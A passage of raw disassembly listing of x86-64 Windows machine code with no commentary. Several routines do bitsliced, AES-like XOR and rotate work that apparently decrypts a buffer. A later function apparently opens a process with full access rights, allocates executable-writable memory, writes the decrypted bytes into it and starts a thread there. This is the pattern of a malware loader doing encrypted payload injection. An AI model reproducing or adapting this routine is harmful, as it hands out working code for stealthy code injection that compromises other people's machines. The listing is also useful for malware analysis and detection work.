    6d8cc304:	48 39 c2             	cmp    %rax,%rdx
    6d8cc307:	7d 0d                	jge    0x6d8cc316
    6d8cc309:	45 8a 0c 10          	mov    (%r8,%rdx,1),%r9b
    6d8cc30d:	44 88 0c 11          	mov    %r9b,(%rcx,%rdx,1)
    6d8cc311:	48 ff c2             	inc    %rdx
    6d8cc314:	eb ee                	jmp    0x6d8cc304
    6d8cc316:	48 83 c4 38          	add    $0x38,%rsp
    6d8cc31a:	5b                   	pop    %rbx
    6d8cc31b:	5e                   	pop    %rsi
    6d8cc31c:	c3                   	ret
    6d8cc31d:	56                   	push   %rsi
    6d8cc31e:	53                   	push   %rbx
    6d8cc31f:	48 83 ec 48          	sub    $0x48,%rsp
    6d8cc323:	48 89 cb             	mov    %rcx,%rbx
    6d8cc326:	4c 89 ce             	mov    %r9,%rsi
    6d8cc329:	e8 f5 fc ff ff       	call   0x6d8cc023
    6d8cc32e:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
    6d8cc333:	ba 10 00 00 00       	mov    $0x10,%edx
    6d8cc338:	4c 89 c9             	mov    %r9,%rcx
    6d8cc33b:	e8 2b f8 ff ff       	call   0x6d8cbb6b
    6d8cc340:	ba 10 00 00 00       	mov    $0x10,%edx
    6d8cc345:	4c 89 c9             	mov    %r9,%rcx
    6d8cc348:	e8 1e f8 ff ff       	call   0x6d8cbb6b
    6d8cc34d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
    6d8cc352:	41 b9 10 00 00 00    	mov    $0x10,%r9d
    6d8cc358:	49 89 f0             	mov    %rsi,%r8
    6d8cc35b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    6d8cc362:	00 00 
    6d8cc364:	48 8d 8b c8 03 00 00 	lea    0x3c8(%rbx),%rcx
    6d8cc36b:	48 c7 44 24 38 0f 00 	movq   $0xf,0x38(%rsp)
    6d8cc372:	00 00 
    6d8cc374:	0f 28 44 24 30       	movaps 0x30(%rsp),%xmm0
    6d8cc379:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
    6d8cc37e:	e8 d2 fe ff ff       	call   0x6d8cc255
    6d8cc383:	90                   	nop
    6d8cc384:	48 83 c4 48          	add    $0x48,%rsp
    6d8cc388:	5b                   	pop    %rbx
    6d8cc389:	5e                   	pop    %rsi
    6d8cc38a:	c3                   	ret
    6d8cc38b:	41 57                	push   %r15
    6d8cc38d:	41 56                	push   %r14
    6d8cc38f:	41 55                	push   %r13
    6d8cc391:	41 54                	push   %r12
    6d8cc393:	55                   	push   %rbp
    6d8cc394:	57                   	push   %rdi
    6d8cc395:	56                   	push   %rsi
    6d8cc396:	53                   	push   %rbx
    6d8cc397:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
    6d8cc39e:	41 be 01 00 00 00    	mov    $0x1,%r14d
    6d8cc3a4:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
    6d8cc3a9:	48 89 cb             	mov    %rcx,%rbx
    6d8cc3ac:	49 89 d2             	mov    %rdx,%r10
    6d8cc3af:	48 89 f1             	mov    %rsi,%rcx
    6d8cc3b2:	ba 40 00 00 00       	mov    $0x40,%edx
    6d8cc3b7:	4c 89 cf             	mov    %r9,%rdi
    6d8cc3ba:	e8 ac f7 ff ff       	call   0x6d8cbb6b
    6d8cc3bf:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
    6d8cc3c4:	ba 10 00 00 00       	mov    $0x10,%edx
    6d8cc3c9:	4c 89 c1             	mov    %r8,%rcx
    6d8cc3cc:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
    6d8cc3d1:	e8 95 f7 ff ff       	call   0x6d8cbb6b
    6d8cc3d6:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
    6d8cc3db:	48 8d 56 20          	lea    0x20(%rsi),%rdx
    6d8cc3df:	48 89 f1             	mov    %rsi,%rcx
    6d8cc3e2:	49 8b 02             	mov    (%r10),%rax
    6d8cc3e5:	48 8d 73 40          	lea    0x40(%rbx),%rsi
    6d8cc3e9:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
    6d8cc3ee:	49 8b 42 08          	mov    0x8(%r10),%rax
    6d8cc3f2:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
    6d8cc3f7:	e8 19 f9 ff ff       	call   0x6d8cbd15
    6d8cc3fc:	e8 ff b7 ff ff       	call   0x6d8c7c00
    6d8cc401:	48 8b 03             	mov    (%rbx),%rax
    6d8cc404:	48 31 44 24 60       	xor    %rax,0x60(%rsp)
    6d8cc409:	48 8b 43 08          	mov    0x8(%rbx),%rax
    6d8cc40d:	48 31 44 24 68       	xor    %rax,0x68(%rsp)
    6d8cc412:	48 8b 43 10          	mov    0x10(%rbx),%rax
    6d8cc416:	48 31 44 24 70       	xor    %rax,0x70(%rsp)
    6d8cc41b:	48 8b 43 18          	mov    0x18(%rbx),%rax
    6d8cc41f:	48 31 44 24 78       	xor    %rax,0x78(%rsp)
    6d8cc424:	48 8b 43 20          	mov    0x20(%rbx),%rax
    6d8cc428:	48 31 84 24 80 00 00 	xor    %rax,0x80(%rsp)
    6d8cc42f:	00 
    6d8cc430:	48 8b 43 28          	mov    0x28(%rbx),%rax
    6d8cc434:	48 31 84 24 88 00 00 	xor    %rax,0x88(%rsp)
    6d8cc43b:	00 
    6d8cc43c:	48 8b 43 30          	mov    0x30(%rbx),%rax
    6d8cc440:	48 31 84 24 90 00 00 	xor    %rax,0x90(%rsp)
    6d8cc447:	00 
    6d8cc448:	48 8b 43 38          	mov    0x38(%rbx),%rax
    6d8cc44c:	48 31 84 24 98 00 00 	xor    %rax,0x98(%rsp)
    6d8cc453:	00 
    6d8cc454:	4c 39 b3 c0 03 00 00 	cmp    %r14,0x3c0(%rbx)
    6d8cc45b:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
    6d8cc460:	48 89 e9             	mov    %rbp,%rcx
    6d8cc463:	7f 3d                	jg     0x6d8cc4a2
    6d8cc465:	e8 07 f4 ff ff       	call   0x6d8cb871
    6d8cc46a:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
    6d8cc471:	00 
    6d8cc472:	48 89 ea             	mov    %rbp,%rdx
    6d8cc475:	49 bb 00 00 00 00 ff 	movabs $0xff00000000,%r11
    6d8cc47c:	00 00 00 
    6d8cc47f:	49 ba 00 00 00 00 00 	movabs $0xff0000000000,%r10
    6d8cc486:	ff 00 00 
    6d8cc489:	49 b9 00 00 00 00 00 	movabs $0xf000000000000,%r9
    6d8cc490:	00 0f 00 
    6d8cc493:	49 b8 00 00 00 00 00 	movabs $0xfff0000000000000,%r8
    6d8cc49a:	00 f0 ff 
    6d8cc49d:	e9 55 02 00 00       	jmp    0x6d8cc6f7
    6d8cc4a2:	e8 ca f3 ff ff       	call   0x6d8cb871
    6d8cc4a7:	b9 ff 0f 00 00       	mov    $0xfff,%ecx
    6d8cc4ac:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
    6d8cc4b3:	00 
    6d8cc4b4:	48 c1 e1 34          	shl    $0x34,%rcx
    6d8cc4b8:	4c 8b 45 00          	mov    0x0(%rbp),%r8
    6d8cc4bc:	48 83 c5 08          	add    $0x8,%rbp
    6d8cc4c0:	49 ba 00 00 00 00 ff 	movabs $0xff00000000,%r10
    6d8cc4c7:	00 00 00 
    6d8cc4ca:	49 bf 00 00 00 00 00 	movabs $0xff0000000000,%r15
    6d8cc4d1:	ff 00 00 
    6d8cc4d4:	4c 89 c0             	mov    %r8,%rax
    6d8cc4d7:	4d 89 c1             	mov    %r8,%r9
    6d8cc4da:	48 c1 e8 04          	shr    $0x4,%rax
    6d8cc4de:	49 c1 e1 0c          	shl    $0xc,%r9
    6d8cc4e2:	41 81 e1 00 00 00 f0 	and    $0xf0000000,%r9d
    6d8cc4e9:	25 00 00 ff 0f       	and    $0xfff0000,%eax
    6d8cc4ee:	4c 09 c8             	or     %r9,%rax
    6d8cc4f1:	45 0f b7 c8          	movzwl %r8w,%r9d
    6d8cc4f5:	4c 09 c8             	or     %r9,%rax
    6d8cc4f8:	4d 89 c1             	mov    %r8,%r9
    6d8cc4fb:	49 c1 e9 08          	shr    $0x8,%r9
    6d8cc4ff:	4d 21 d1             	and    %r10,%r9
    6d8cc502:	4c 09 c8             	or     %r9,%rax
    6d8cc505:	4d 89 c1             	mov    %r8,%r9
    6d8cc508:	49 c1 e1 08          	shl    $0x8,%r9
    6d8cc50c:	4d 21 f9             	and    %r15,%r9
    6d8cc50f:	49 bf 00 00 00 00 00 	movabs $0xf000000000000,%r15
    6d8cc516:	00 0f 00 
    6d8cc519:	4c 09 c8             	or     %r9,%rax
    6d8cc51c:	4d 89 c1             	mov    %r8,%r9
    6d8cc51f:	49 c1 e0 04          	shl    $0x4,%r8
    6d8cc523:	49 c1 e9 0c          	shr    $0xc,%r9
    6d8cc527:	49 21 c8             	and    %rcx,%r8
    6d8cc52a:	4d 21 f9             	and    %r15,%r9
    6d8cc52d:	4c 09 c8             	or     %r9,%rax
    6d8cc530:	4c 09 c0             	or     %r8,%rax
    6d8cc533:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    6d8cc537:	48 39 ea             	cmp    %rbp,%rdx
    6d8cc53a:	0f 85 78 ff ff ff    	jne    0x6d8cc4b8
    6d8cc540:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
    6d8cc547:	00 
    6d8cc548:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
    6d8cc54d:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
    6d8cc552:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
    6d8cc557:	4c 89 e9             	mov    %r13,%rcx
    6d8cc55a:	4c 8b 5c 24 70       	mov    0x70(%rsp),%r11
    6d8cc55f:	48 c1 c9 10          	ror    $0x10,%rcx
    6d8cc563:	48 89 ea             	mov    %rbp,%rdx
    6d8cc566:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
    6d8cc56b:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
    6d8cc572:	00 
    6d8cc573:	48 c1 ca 10          	ror    $0x10,%rdx
    6d8cc577:	4c 89 d0             	mov    %r10,%rax
    6d8cc57a:	4c 33 6c 24 20       	xor    0x20(%rsp),%r13
    6d8cc57f:	48 31 d5             	xor    %rdx,%rbp
    6d8cc582:	48 c1 c8 10          	ror    $0x10,%rax
    6d8cc586:	4d 89 e1             	mov    %r12,%r9
    6d8cc589:	4d 89 d8             	mov    %r11,%r8
    6d8cc58c:	49 31 c2             	xor    %rax,%r10
    6d8cc58f:	49 c1 c9 10          	ror    $0x10,%r9
    6d8cc593:	49 c1 c8 10          	ror    $0x10,%r8
    6d8cc597:	48 c1 c9 10          	ror    $0x10,%rcx
    6d8cc59b:	4d 31 cc             	xor    %r9,%r12
    6d8cc59e:	4d 31 c3             	xor    %r8,%r11
    6d8cc5a1:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
    6d8cc5a6:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
    6d8cc5ad:	00 
    6d8cc5ae:	49 31 e8             	xor    %rbp,%r8
    6d8cc5b1:	4d 89 e7             	mov    %r12,%r15
    6d8cc5b4:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
    6d8cc5b9:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
    6d8cc5be:	49 c1 c7 20          	rol    $0x20,%r15
    6d8cc5c2:	4c 33 ac 24 88 00 00 	xor    0x88(%rsp),%r13
    6d8cc5c9:	00 
    6d8cc5ca:	48 c1 c9 10          	ror    $0x10,%rcx
    6d8cc5ce:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
    6d8cc5d3:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
    6d8cc5da:	00 
    6d8cc5db:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
    6d8cc5e0:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
    6d8cc5e5:	4c 33 ac 24 90 00 00 	xor    0x90(%rsp),%r13
    6d8cc5ec:	00 
    6d8cc5ed:	48 c1 c9 10          	ror    $0x10,%rcx
    6d8cc5f1:	48 31 ca             	xor    %rcx,%rdx
    6d8cc5f4:	48 33 94 24 98 00 00 	xor    0x98(%rsp),%rdx
    6d8cc5fb:	00 
    6d8cc5fc:	48 31 c8             	xor    %rcx,%rax
    6d8cc5ff:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
    6d8cc604:	4c 8b ac 24 98 00 00 	mov    0x98(%rsp),%r13
    6d8cc60b:	00 
    6d8cc60c:	48 33 84 24 98 00 00 	xor    0x98(%rsp),%rax
    6d8cc613:	00 
    6d8cc614:	49 31 d4             	xor    %rdx,%r12
    6d8cc617:	48 89 ea             	mov    %rbp,%rdx
    6d8cc61a:	4c 89 dd             	mov    %r11,%rbp
    6d8cc61d:	48 c1 c2 20          	rol    $0x20,%rdx
    6d8cc621:	49 31 cd             	xor    %rcx,%r13
    6d8cc624:	48 c1 c5 20          	rol    $0x20,%rbp
    6d8cc628:	4d 31 e9             	xor    %r13,%r9
    6d8cc62b:	49 31 d4             	xor    %rdx,%r12
    6d8cc62e:	4c 31 c5             	xor    %r8,%rbp
    6d8cc631:	4c 33 66 08          	xor    0x8(%rsi),%r12
    6d8cc635:	48 33 6e 10          	xor    0x10(%rsi),%rbp
    6d8cc639:	4d 31 f9             	xor    %r15,%r9
    6d8cc63c:	4c 33 0e             	xor    (%rsi),%r9
    6d8cc63f:	49 31 c3             	xor    %rax,%r11
    6d8cc642:	4c 89 d0             	mov    %r10,%rax
    6d8cc645:	48 c1 c0 20          	rol    $0x20,%rax
    6d8cc649:	49 ff c6             	inc    %r14
    6d8cc64c:	49 31 c3             	xor    %rax,%r11
    6d8cc64f:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
    6d8cc654:	49 c1 c5 20          	rol    $0x20,%r13
    6d8cc658:	48 83 c6 40          	add    $0x40,%rsi
    6d8cc65c:	4c 33 5e d8          	xor    -0x28(%rsi),%r11
    6d8cc660:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
    6d8cc665:	4c 89 4c 24 60       	mov    %r9,0x60(%rsp)
    6d8cc66a:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
    6d8cc66f:	48 31 c8             	xor    %rcx,%rax
    6d8cc672:	48 33 84 24 98 00 00 	xor    0x98(%rsp),%rax
    6d8cc679:	00 
    6d8cc67a:	4c 89 5c 24 78       	mov    %r11,0x78(%rsp)
    6d8cc67f:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6d8cc684:	48 33 4c 24 48       	xor    0x48(%rsp),%rcx
    6d8cc689:	4c 31 d0             	xor    %r10,%rax
    6d8cc68c:	48 c1 c2 20          	rol    $0x20,%rdx
    6d8cc690:	48 31 d0             	xor    %rdx,%rax
    6d8cc693:	48 33 46 e0          	xor    -0x20(%rsi),%rax
    6d8cc697:	4c 31 e9             	xor    %r13,%rcx
    6d8cc69a:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
    6d8cc69f:	48 33 4e f8          	xor    -0x8(%rsi),%rcx
    6d8cc6a3:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
    6d8cc6aa:	00 
    6d8cc6ab:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8cc6b0:	48 33 44 24 38       	xor    0x38(%rsp),%rax
    6d8cc6b5:	48 c1 c2 20          	rol    $0x20,%rdx
    6d8cc6b9:	48 89 8c 24 98 00 00 	mov    %rcx,0x98(%rsp)
    6d8cc6c0:	00 
    6d8cc6c1:	48 31 d0             	xor    %rdx,%rax
    6d8cc6c4:	48 33 46 e8          	xor    -0x18(%rsi),%rax
    6d8cc6c8:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
    6d8cc6cd:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
    6d8cc6d4:	00 
    6d8cc6d5:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
    6d8cc6da:	48 33 44 24 40       	xor    0x40(%rsp),%rax
    6d8cc6df:	48 c1 c2 20          	rol    $0x20,%rdx
    6d8cc6e3:	48 31 d0             	xor    %rdx,%rax
    6d8cc6e6:	48 33 46 f0          	xor    -0x10(%rsi),%rax
    6d8cc6ea:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
    6d8cc6f1:	00 
    6d8cc6f2:	e9 5d fd ff ff       	jmp    0x6d8cc454
    6d8cc6f7:	48 8b 32             	mov    (%rdx),%rsi
    6d8cc6fa:	48 83 c2 08          	add    $0x8,%rdx
    6d8cc6fe:	48 89 f0             	mov    %rsi,%rax
    6d8cc701:	49 89 f4             	mov    %rsi,%r12
    6d8cc704:	48 c1 e8 04          	shr    $0x4,%rax
    6d8cc708:	49 c1 e4 0c          	shl    $0xc,%r12
    6d8cc70c:	41 81 e4 00 00 00 f0 	and    $0xf0000000,%r12d
    6d8cc713:	25 00 00 ff 0f       	and    $0xfff0000,%eax
    6d8cc718:	4c 09 e0             	or     %r12,%rax
    6d8cc71b:	44 0f b7 e6          	movzwl %si,%r12d
    6d8cc71f:	4c 09 e0             	or     %r12,%rax
    6d8cc722:	49 89 f4             	mov    %rsi,%r12
    6d8cc725:	49 c1 ec 08          	shr    $0x8,%r12
    6d8cc729:	4d 21 dc             	and    %r11,%r12
    6d8cc72c:	4c 09 e0             	or     %r12,%rax
    6d8cc72f:	49 89 f4             	mov    %rsi,%r12
    6d8cc732:	49 c1 e4 08          	shl    $0x8,%r12
    6d8cc736:	4d 21 d4             	and    %r10,%r12
    6d8cc739:	4c 09 e0             	or     %r12,%rax
    6d8cc73c:	49 89 f4             	mov    %rsi,%r12
    6d8cc73f:	48 c1 e6 04          	shl    $0x4,%rsi
    6d8cc743:	49 c1 ec 0c          	shr    $0xc,%r12
    6d8cc747:	4c 21 c6             	and    %r8,%rsi
    6d8cc74a:	4d 21 cc             	and    %r9,%r12
    6d8cc74d:	4c 09 e0             	or     %r12,%rax
    6d8cc750:	48 09 f0             	or     %rsi,%rax
    6d8cc753:	48 89 42 f8          	mov    %rax,-0x8(%rdx)
    6d8cc757:	48 39 d1             	cmp    %rdx,%rcx
    6d8cc75a:	75 9b                	jne    0x6d8cc6f7
    6d8cc75c:	48 8b 83 c0 03 00 00 	mov    0x3c0(%rbx),%rax
    6d8cc763:	48 89 e9             	mov    %rbp,%rcx
    6d8cc766:	48 c1 e0 06          	shl    $0x6,%rax
    6d8cc76a:	48 01 c3             	add    %rax,%rbx
    6d8cc76d:	48 8b 03             	mov    (%rbx),%rax
    6d8cc770:	48 31 44 24 60       	xor    %rax,0x60(%rsp)
    6d8cc775:	48 8b 43 08          	mov    0x8(%rbx),%rax
    6d8cc779:	48 31 44 24 68       	xor    %rax,0x68(%rsp)
    6d8cc77e:	48 8b 43 10          	mov    0x10(%rbx),%rax
    6d8cc782:	48 31 44 24 70       	xor    %rax,0x70(%rsp)
    6d8cc787:	48 8b 43 18          	mov    0x18(%rbx),%rax
    6d8cc78b:	48 31 44 24 78       	xor    %rax,0x78(%rsp)
    6d8cc790:	48 8b 43 20          	mov    0x20(%rbx),%rax
    6d8cc794:	48 31 84 24 80 00 00 	xor    %rax,0x80(%rsp)
    6d8cc79b:	00 
    6d8cc79c:	48 8b 43 28          	mov    0x28(%rbx),%rax
    6d8cc7a0:	48 31 84 24 88 00 00 	xor    %rax,0x88(%rsp)
    6d8cc7a7:	00 
    6d8cc7a8:	48 8b 43 30          	mov    0x30(%rbx),%rax
    6d8cc7ac:	48 31 84 24 90 00 00 	xor    %rax,0x90(%rsp)
    6d8cc7b3:	00 
    6d8cc7b4:	48 8b 43 38          	mov    0x38(%rbx),%rax
    6d8cc7b8:	48 31 84 24 98 00 00 	xor    %rax,0x98(%rsp)
    6d8cc7bf:	00 
    6d8cc7c0:	e8 3b b4 ff ff       	call   0x6d8c7c00
    6d8cc7c5:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
    6d8cc7ca:	49 b9 ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%r9
    6d8cc7d1:	00 ff 00 
    6d8cc7d4:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
    6d8cc7db:	00 
    6d8cc7dc:	49 89 d0             	mov    %rdx,%r8
    6d8cc7df:	48 c1 ea 08          	shr    $0x8,%rdx
    6d8cc7e3:	4d 21 c8             	and    %r9,%r8
    6d8cc7e6:	48 89 c1             	mov    %rax,%rcx
    6d8cc7e9:	48 c1 e8 08          	shr    $0x8,%rax
    6d8cc7ed:	4c 21 c9             	and    %r9,%rcx
    6d8cc7f0:	4c 21 ca             	and    %r9,%rdx
    6d8cc7f3:	4c 21 c8             	and    %r9,%rax
    6d8cc7f6:	4d 89 c1             	mov    %r8,%r9
    6d8cc7f9:	49 c1 e9 08          	shr    $0x8,%r9
    6d8cc7fd:	4d 09 c8             	or     %r9,%r8
    6d8cc800:	49 89 c9             	mov    %rcx,%r9
    6d8cc803:	49 c1 e9 08          	shr    $0x8,%r9
    6d8cc807:	4c 09 c9             	or     %r9,%rcx
    6d8cc80a:	49 89 d1             	mov    %rdx,%r9
    6d8cc80d:	49 c1 e9 08          	shr    $0x8,%r9
    6d8cc811:	4c 09 ca             	or     %r9,%rdx
    6d8cc814:	49 89 c1             	mov    %rax,%r9
    6d8cc817:	49 c1 e9 08          	shr    $0x8,%r9
    6d8cc81b:	4c 09 c8             	or     %r9,%rax
    6d8cc81e:	49 b9 ff ff 00 00 ff 	movabs $0xffff0000ffff,%r9
    6d8cc825:	ff 00 00 
    6d8cc828:	4d 21 c8             	and    %r9,%r8
    6d8cc82b:	4c 21 ca             	and    %r9,%rdx
    6d8cc82e:	4c 21 c8             	and    %r9,%rax
    6d8cc831:	4c 21 c9             	and    %r9,%rcx
    6d8cc834:	4d 89 c1             	mov    %r8,%r9
    6d8cc837:	49 c1 e9 10          	shr    $0x10,%r9
    6d8cc83b:	45 09 c8             	or     %r9d,%r8d
    6d8cc83e:	44 89 07             	mov    %r8d,(%rdi)
    6d8cc841:	49 89 c8             	mov    %rcx,%r8
    6d8cc844:	49 c1 e8 10          	shr    $0x10,%r8
    6d8cc848:	44 09 c1             	or     %r8d,%ecx
    6d8cc84b:	89 4f 04             	mov    %ecx,0x4(%rdi)
    6d8cc84e:	48 89 d1             	mov    %rdx,%rcx
    6d8cc851:	48 c1 e9 10          	shr    $0x10,%rcx
    6d8cc855:	09 ca                	or     %ecx,%edx
    6d8cc857:	89 57 08             	mov    %edx,0x8(%rdi)
    6d8cc85a:	48 89 c2             	mov    %rax,%rdx
    6d8cc85d:	48 c1 ea 10          	shr    $0x10,%rdx
    6d8cc861:	09 d0                	or     %edx,%eax
    6d8cc863:	89 47 0c             	mov    %eax,0xc(%rdi)
    6d8cc866:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
    6d8cc86d:	5b                   	pop    %rbx
    6d8cc86e:	5e                   	pop    %rsi
    6d8cc86f:	5f                   	pop    %rdi
    6d8cc870:	5d                   	pop    %rbp
    6d8cc871:	41 5c                	pop    %r12
    6d8cc873:	41 5d                	pop    %r13
    6d8cc875:	41 5e                	pop    %r14
    6d8cc877:	41 5f                	pop    %r15
    6d8cc879:	c3                   	ret
    6d8cc87a:	56                   	push   %rsi
    6d8cc87b:	53                   	push   %rbx
    6d8cc87c:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
    6d8cc883:	4c 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%r9
    6d8cc88a:	00 
    6d8cc88b:	49 89 d2             	mov    %rdx,%r10
    6d8cc88e:	48 89 ce             	mov    %rcx,%rsi
    6d8cc891:	48 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%rbx
    6d8cc898:	00 
    6d8cc899:	4c 89 c9             	mov    %r9,%rcx
    6d8cc89c:	ba 10 00 00 00       	mov    $0x10,%edx
    6d8cc8a1:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
    6d8cc8a6:	e8 c0 f2 ff ff       	call   0x6d8cbb6b
    6d8cc8ab:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8cc8b0:	48 89 d9             	mov    %rbx,%rcx
    6d8cc8b3:	e8 b3 f2 ff ff       	call   0x6d8cbb6b
    6d8cc8b8:	48 8b 0d 69 29 10 00 	mov    0x102969(%rip),%rcx        # 0x6d9cf228
    6d8cc8bf:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
    6d8cc8c6:	00 00 
    6d8cc8c8:	4c 89 94 24 90 00 00 	mov    %r10,0x90(%rsp)
    6d8cc8cf:	00 
    6d8cc8d0:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
    6d8cc8d7:	00 00 00 00 00 
    6d8cc8dc:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
    6d8cc8e3:	00 00 00 00 00 
    6d8cc8e8:	e8 6c eb ff ff       	call   0x6d8cb459
    6d8cc8ed:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
    6d8cc8f4:	00 
    6d8cc8f5:	ff 15 2d 28 10 00    	call   *0x10282d(%rip)        # 0x6d9cf128
    6d8cc8fb:	31 d2                	xor    %edx,%edx
    6d8cc8fd:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
    6d8cc902:	41 89 c0             	mov    %eax,%r8d
    6d8cc905:	ff 15 9d 28 10 00    	call   *0x10289d(%rip)        # 0x6d9cf1a8
    6d8cc90b:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
    6d8cc910:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
    6d8cc915:	49 89 d8             	mov    %rbx,%r8
    6d8cc918:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
    6d8cc91d:	e8 3a da ff ff       	call   0x6d8ca35c
    6d8cc922:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
    6d8cc927:	48 8d 94 24 88 00 00 	lea    0x88(%rsp),%rdx
    6d8cc92e:	00 
    6d8cc92f:	45 31 c0             	xor    %r8d,%r8d
    6d8cc932:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
    6d8cc939:	00 
    6d8cc93a:	c7 44 24 28 40 00 00 	movl   $0x40,0x28(%rsp)
    6d8cc941:	00 
    6d8cc942:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
    6d8cc949:	00 
    6d8cc94a:	e8 7f da ff ff       	call   0x6d8ca3ce
    6d8cc94f:	48 8d 84 24 98 00 00 	lea    0x98(%rsp),%rax
    6d8cc956:	00 
    6d8cc957:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
    6d8cc95c:	49 89 f0             	mov    %rsi,%r8
    6d8cc95f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6d8cc964:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
    6d8cc96b:	00 
    6d8cc96c:	48 8b 94 24 88 00 00 	mov    0x88(%rsp),%rdx
    6d8cc973:	00 
    6d8cc974:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
    6d8cc97b:	00 00 00 00 00 
    6d8cc980:	4c 8d 48 ff          	lea    -0x1(%rax),%r9
    6d8cc984:	e8 af da ff ff       	call   0x6d8ca438
    6d8cc989:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
    6d8cc990:	00 
    6d8cc991:	45 31 c0             	xor    %r8d,%r8d
    6d8cc994:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
    6d8cc999:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
    6d8cc99e:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
    6d8cc9a5:	00 
    6d8cc9a6:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
    6d8cc9ad:	00 00 
    6d8cc9af:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    6d8cc9b6:	00 00 
    6d8cc9b8:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
    6d8cc9bf:	00 00 
    6d8cc9c1:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    6d8cc9c8:	00 00 
    6d8cc9ca:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
    6d8cc9d1:	00 
    6d8cc9d2:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    6d8cc9d9:	00 00 
    6d8cc9db:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6d8cc9e0:	e8 c3 da ff ff       	call   0x6d8ca4a8
    6d8cc9e5:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
    6d8cc9ec:	00 
    6d8cc9ed:	e8 20 db ff ff       	call   0x6d8ca512
    6d8cc9f2:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
    6d8cc9f7:	e8 16 db ff ff       	call   0x6d8ca512
    6d8cc9fc:	90                   	nop
    6d8cc9fd:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
    6d8cca04:	5b                   	pop    %rbx
    6d8cca05:	5e                   	pop    %rsi
    6d8cca06:	c3                   	ret
    6d8cca07:	41 57                	push   %r15
    6d8cca09:	41 56                	push   %r14
    6d8cca0b:	41 55                	push   %r13
    6d8cca0d:	41 54                	push   %r12
    6d8cca0f:	55                   	push   %rbp
    6d8cca10:	57                   	push   %rdi
    6d8cca11:	56                   	push   %rsi
    6d8cca12:	53                   	push   %rbx
    6d8cca13:	48 83 ec 58          	sub    $0x58,%rsp
    6d8cca17:	48 8d 0d e9 f2 ff ff 	lea    -0xd17(%rip),%rcx        # 0x6d8cbd07
    6d8cca1e:	e8 5a 82 ff ff       	call   0x6d8c4c7d
